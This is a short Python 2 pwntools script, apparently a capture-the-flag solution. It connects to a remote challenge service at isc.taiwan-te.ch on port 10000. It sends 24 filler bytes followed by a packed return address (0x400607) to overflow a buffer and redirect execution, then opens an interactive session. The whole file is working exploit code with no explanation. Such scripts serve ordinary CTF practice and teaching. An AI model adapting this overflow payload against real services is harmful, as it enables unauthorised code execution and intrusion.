#!/usr/bin/env python2

from pwn import *

p = remote('isc.taiwan-te.ch', 10000)
payload = 'A'* 24 + p64(0x0000000000400607)
p.sendlineafter('challenge ;)\n', payload)
p.interactive()
p.close()
